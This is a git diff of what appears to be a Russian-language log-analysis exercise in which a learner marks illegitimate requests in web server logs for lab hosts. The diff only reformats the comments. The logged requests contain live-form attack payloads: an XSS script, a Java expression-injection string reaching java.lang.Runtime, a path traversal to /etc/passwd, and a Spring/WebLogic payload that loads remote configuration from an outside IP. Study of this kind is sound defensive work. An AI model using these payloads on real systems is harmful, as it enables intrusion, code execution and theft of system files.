@@ -136,17 +136,16 @@ HTTP/1.1"
 Ex 5:
 Нелегитимные запросы в данном логе:
 2023-02-15T08:32:00	data.kaspi.lab 443 85.117.101.213 10.2.1.12	80	GET	/market/api/v2/orders	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36	%3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E	kaspi.lab
-Запрос содержит параметр запроса "%3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E", который является скриптом JavaScript, с помощью него можно внедрить js-код в НTML 
-ip с которого отправили запрос - 85.117.101.213
+ > Запрос содержит параметр запроса "%3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E", который является скриптом JavaScript, с помощью него можно внедрить js-код в НTML ip с которого отправили запрос - 85.117.101.213
 
 2023-02-15T08:32:00	chat.kaspi.lab 443 188.246.252.144 10.17.8.228	80	POST/market/p/linea-8035154p-55-zoloto-100959802/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36	lang=ru-RU&code=&query=%D0	kaspi.lab
-Не уверен на признак уязвимости, однако запрос хранит http протокол и подозрительные параметры code=&query=% могут содержать данные
+ > Не уверен на признак уязвимости, однако запрос хранит http протокол и подозрительные параметры code=&query=% могут содержать данные
 
 2023-02-15T08:32:00	new.kaspi.lab 443 81.91.187.59	10.2.50.20	80	POST	/bottles/dashboars/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+9;+TECNO+CC7+Build/PPR1.180610.011;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/101.0.4951.41+Mobile+Safari/537.366	actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D	kaspi.lab
-Не уверен на признак уязвимости, однако запрос хранит “actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D” в котором может хранится вредоносный код
+ > Не уверен на признак уязвимости, однако запрос хранит “actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D” в котором может хранится вредоносный код
 
 2023-02-15T08:32:00	dev.kaspi.lab 443 78.109.191.117 10.2.50.21	80	POST /page/api/login/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+12;+SM-A315F+Build/SP1A.210812.016;+wv)	view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd	kaspi.lab
-параметре "view" указана строка, которая содержит путь до файла "/etc/passwd",
+ > параметре "view" указана строка, которая содержит путь до файла "/etc/passwd",
 
 2023-02-15T08:32:00	forum.kaspi.lab 443	79.133.190.153 10.2.1.12	80	POST	/bottles/dashboardapi2/api/v1/Dashboard/getSampleRequest	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(iPhone;+CPU+iPhone+OS+13,4+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148	_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29	kaspi.lab
-'_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29’  - возможна уязвимость
+ > '_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29’  - возможна уязвимость
